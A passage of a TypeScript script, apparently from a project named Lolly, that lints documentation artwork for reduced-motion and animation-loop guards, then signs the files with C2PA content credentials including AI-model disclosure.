  // Read with comments BLANKED. Every rule above scans comments on purpose (a
  // denylist you can satisfy by rephrasing is still a denylist); a guard is the
  // opposite kind of claim — it has to be code that runs, or one comment saying
  // "this artwork honours prefers-reduced-motion and suspends on visibilitychange"
  // satisfies both halves of the contract while the rAF loop below it never stops.
  const runs = blankComments(text);
  const lines = runs.split('\n');
  const guardLines = lines.flatMap((l, i) => (REDUCED_MOTION.test(l) ? [i] : []));
  text.split('\n').forEach((l, i) => {
    if (!MOTION_JS.test(l)) return;
    if (!guardLines.some((g) => Math.abs(g - i) <= MOTION_GUARD_WINDOW)) {
      add('motion', i + 1, `JS motion with no \`prefers-reduced-motion\` guard within ${MOTION_GUARD_WINDOW} lines — motion is opt-in, the guard has to be visible beside the loop it governs, and a comment is not a guard`);
    }
  });
  if (MOTION_CSS.test(runs)) {
    // "Mentions the query somewhere" accepted an INVERTED one: a
    // `(prefers-reduced-motion: reduce)` block full of animation, plus
    // unconditional animation outside it, passed — motion for everyone and extra
    // motion for the readers who asked for less. The contract (plan §6) is that
    // self-running motion sits behind `no-preference`; the equally honest shape is
    // a `reduce` block that turns it off. Those two, and nothing else.
    const reduce = reduceMotionBlocks(runs);
    const guarded = CSS_MOTION_NO_PREF.test(runs) || reduce.some((b) => CSS_MOTION_OFF.test(b));
    if (!guarded) {
      add('motion', null, 'CSS animation with no `prefers-reduced-motion` guard — put the motion behind `@media (prefers-reduced-motion: no-preference)`, or turn it off inside `@media (prefers-reduced-motion: reduce)`');
    }
    for (const b of reduce) {
      if (declaresMotion(b)) add('motion', null, 'motion declared INSIDE `@media (prefers-reduced-motion: reduce)` — that block is for readers who asked for less motion, not more');
    }
  }
  // A rAF loop that never stops keeps a hidden tab painting and a scrolled-past
  // masthead burning battery for the length of the page (the canvas rAF-gating
  // lesson). One of the three signals must be present — in CODE, for the same
  // reason the reduced-motion guard has to be.
  if (/\brequestAnimationFrame\s*\(/.test(text) && !SELF_SUSPEND.test(runs)) {
    add('motion', null, 'a requestAnimationFrame loop with no self-suspend — gate it on `visibilitychange`/`document.hidden` or an IntersectionObserver so it stops off-screen and in a hidden tab');
  }
  return out;
}

// ── The credential ────────────────────────────────────────────────────────────

/** Width/height for the credential line's dimensions pill, from the artwork's own
 *  viewBox. Absent (not guessed) when the artifact does not declare one. */
export function artDims(text: string): { width: number; height: number } | undefined {
  const first = [...openTags(text, 'svg')][0];
  const vb = first && /\bviewBox\s*=\s*["']([^"']+)["']/i.exec(first.src)?.[1];
  const n = vb?.trim().split(/[\s,]+/).map(Number);
  if (!n || n.length !== 4 || n.some((x) => !Number.isFinite(x)) || n[2]! <= 0 || n[3]! <= 0) return undefined;
  return { width: Math.round(n[2]!), height: Math.round(n[3]!) };
}

export interface ArtClaimContext { id: string; kind: ArtKind; format: string; dims?: { width: number; height: number } }

/**
 * meta.json → the embedC2pa options. The three-way split of §18.28.3 lives here:
 * the SOURCE is always declared on the created action, the DISCLOSURE only when a
 * trained model was actually involved, and the authoring tool rides in the action's
 * description because every step's softwareAgent is Lolly (the claim generator).
 */
export function artC2paOpts(meta: ArtMeta, ctx: ArtClaimContext): ExportC2paOpts {
  const generator = meta.generator.version ? `${meta.generator.name} ${meta.generator.version}` : meta.generator.name;
  const modelled = meta.source !== 'digitalCreation';
  const opts = buildExportC2paOpts({
    surface: 'docs',
    manifest: { id: ctx.id, name: ctx.id },
    model: [],
    format: ctx.format,
    ...(ctx.dims ? { dims: { width: ctx.dims.width, height: ctx.dims.height, unit: 'px' } } : {}),
    days: ART_CREDENTIAL_DAYS,
    specVersion: C2PA_SPEC_VERSION,
    actions: [{
      action: 'c2pa.created',
      digitalSourceType: ART_SOURCE_TYPES[meta.source],
      description: `Authored with ${generator} for the Lolly docs ${ctx.kind} bank`,
    }],
    // §18.28.3: no disclosure beside digitalCreation. validateArtMeta has already
    // refused a meta that names a model there, so this is the second half of one
    // rule, not a silent drop.
    ...(modelled && (meta.model || meta.oversight)
      ? {
        aiDisclosure: {
          ...(meta.model?.name ? { modelName: meta.model.name } : {}),
          ...(meta.model?.identifier ? { modelIdentifier: meta.model.identifier } : {}),
          ...(meta.oversight ? { oversight: meta.oversight } : {}),
        },
      }
      : {}),
  });
  // The environment assertion is Lolly's own namespace, and the only place the
  // artifact's editorial role and its authoring tool are recorded as plain facts
  // (claim_generator_info is reserved by §10.2.3.2 for the claim's own generator).
  return {
    ...opts,
    environment: {
      ...(opts.environment as Record<string, unknown>),
      artifact: ctx.kind,
      generator,
      ...(meta.locale ? { locale: meta.locale } : {}),
    },
  };
}

// ── Change detection ──────────────────────────────────────────────────────────

export interface BindingState { signed: boolean; bound: boolean; expired: boolean }

/**
 * Does this file already carry a credential that binds to ITS CURRENT BYTES?
 *
 * The question is deliberately narrower than "does it verify": an ephemeral
 * self-signed key is reported untrusted by design, and a certificate that has aged
 * out is still a true record of bytes that never changed. Re-signing on either would
 * churn every committed artifact on a schedule nobody chose. The hard binding and
 * the claim signature are the two facts that actually say "these bytes are the ones
 * that were signed".
 */
export async function artBindingState(bytes: Uint8Array): Promise<BindingState> {
  if (!extractC2paStore(bytes)) return { signed: false, bound: false, expired: false };
  try {
    const report = await verifyC2pa(bytes);
    const ok = (code: string): boolean => report.checks.some((c) => c.code === code && c.ok);
    const failed = (code: string): boolean => report.checks.some((c) => c.code === code && !c.ok);
    return {
      signed: true,
      bound: report.found && ok(C2PA_CHECK.assertionDataHashMatch) && ok(C2PA_CHECK.claimSignatureValidated),
      expired: failed(C2PA_CHECK.claimSignatureInsideValidity) || failed(C2PA_CHECK.signingCredentialExpired),
    };
  } catch {
    return { signed: true, bound: false, expired: false };
  }
}

// ── The run ───────────────────────────────────────────────────────────────────

export interface ArtEntry { id: string; path: string; kind: ArtKind; format: string; source: string; meta: ArtMeta }
export interface SignRun {
  violations: Violation[];
  /** Artifacts written this run. */
  signed: string[];
  /** Already bound to their current bytes — untouched. */
  skipped: string[];
  /** --check only: what a real run would have signed. */
  wouldSign: string[];
  warnings: string[];
}

const artFiles = (dir: string): string[] => (existsSync(dir)
  ? readdirSync(dir).filter((f) => ART_FORMATS[f.slice(f.lastIndexOf('.')).toLowerCase()] !== undefined).sort()
  : []);

export interface SignDocsArtOptions { docsDir?: string; force?: boolean; check?: boolean; log?: (line: string) => void }

export async function signDocsArt(o: SignDocsArtOptions = {}): Promise<SignRun> {
  const docsDir = o.docsDir ?? join(ROOT, 'docs');
  const log = o.log ?? ((l: string) => console.log(l));
  const run: SignRun = { violations: [], signed: [], skipped: [], wouldSign: [], warnings: [] };
  const entries: ArtEntry[] = [];

  // ── Pass 1: read + validate + lint EVERYTHING. Nothing is written in this pass,
  // so a bank with one bad artifact leaves the other files exactly as they were.
  for (const bank of artBanks(docsDir)) {
    for (const file of artFiles(bank.dir)) {
      const path = join(bank.dir, file);
      const ext = file.slice(file.lastIndexOf('.')).toLowerCase();
      const format = ART_FORMATS[ext]!;
      const id = basename(file, ext);
      const rel = `${bank.kind === 'masthead' ? 'mastheads' : 'figures'}/${file}`;
      const v = (rule: string, message: string, line: number | null = null): void => {
        run.violations.push({ file: rel, rule, line, message });
      };

      let text: string;
      try {
        text = new TextDecoder('utf-8', { fatal: true }).decode(new Uint8Array(readFileSync(path)));
      } catch {
        v('binary', 'not valid UTF-8 — a banked artifact is text');
        continue;
      }
      // The manifest comes off FIRST: the lint reads source, not base64, and the
      // budget measures what an author wrote, not what signing added.
      const source = stripArtManifest(text, format);
      // Linted unconditionally, before anything about the meta is known — an
      // artifact with a broken sidecar still gets its full list of problems, so
      // curation is one pass rather than a sequence of one-problem-per-run rounds.
      run.violations.push(...lintArtSource(source, { file: rel, kind: bank.kind, format, budget: bank.budget }));

      const metaPath = join(bank.dir, `${id}.meta.json`);
      if (!existsSync(metaPath)) {
        // Provenance is not optional: without a meta there is no honest claim to
        // make, and the fallback would be the script inventing one.
        v('meta', `no ${id}.meta.json beside it — every banked artifact declares its generator and source type`);
        continue;
      }
      let parsed: unknown;
      try {
        parsed = JSON.parse(readFileSync(metaPath, 'utf-8'));
      } catch (e) {
        v('meta', `${id}.meta.json is not valid JSON — ${(e as Error).message}`);
        continue;
      }
      const checked = validateArtMeta(parsed);
      if ('problems' in checked) {
        for (const p of checked.problems) v('meta', `${id}.meta.json: ${p}`);
        continue;
      }
      entries.push({ id, path, kind: bank.kind, format, source, meta: checked.meta });
    }
  }

  if (run.violations.length) {
    for (const x of run.violations) log(`  ✗ ${x.file}${x.line ? `:${x.line}` : ''}  [${x.rule}] ${x.message}`);
    log(`\n${run.violations.length} violation(s) — nothing signed. The bank is a trust boundary: fix or withdraw the artifact.`);
    return run;
  }

  // ── Pass 2: sign what changed.
  for (const e of entries) {
    const bytes = new Uint8Array(readFileSync(e.path));
    const state = await artBindingState(bytes);
    if (state.bound && !o.force) {
      run.skipped.push(e.id);
      if (state.expired) run.warnings.push(`${e.id}: credential intact but its certificate has aged out — re-sign with --force when convenient`);
      log(`  = ${e.id} unchanged — credential still binds`);
      continue;
    }
    if (o.check) {
      run.wouldSign.push(e.id);
      log(`  ~ ${e.id} would be signed (${state.signed ? 'content changed since signing' : 'no credential yet'})`);
      continue;
    }
    // Sign the SOURCE, not the file: re-signing a file that still carries a stale
    // manifest would leave the placer to strip it, and the strip is ours to prove.
    const dims = artDims(e.source);
    const opts = artC2paOpts(e.meta, { id: e.id, kind: e.kind, format: e.format, ...(dims ? { dims } : {}) });
    const out = await embedC2pa(new TextEncoder().encode(e.source), e.format, opts);
    writeFileSync(e.path, out);
    run.signed.push(e.id);
    log(`  ✓ ${e.id} signed — ${Buffer.byteLength(e.source, 'utf8')} B source → ${out.length} B`
      + `${e.meta.source === 'digitalCreation' ? '' : `, disclosing ${e.meta.model?.name ?? 'a trained model'}`}`);
  }
  for (const w of run.warnings) log(`  ⚠ ${w}`);
  return run;
}

async function main(): Promise<void> {
  const force = process.argv.includes('--force');
  const check = process.argv.includes('--check');
  console.log(`Docs art bank — ${check ? 'checking' : 'signing'} docs/mastheads + docs/figures`
    + `${force ? ' (--force: re-signing everything)' : ''}`);
  const run = await signDocsArt({ force, check });
  if (run.violations.length) process.exitCode = 1;
  else {
    console.log(`\n✓ ${run.signed.length} signed, ${run.skipped.length} unchanged`
      + `${run.wouldSign.length ? `, ${run.wouldSign.length} would be signed` : ''}`);
    if (run.signed.length) console.log('  Next: rebuild /info so the served copies match (npm run build:info).');
  }
}

if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) await main();
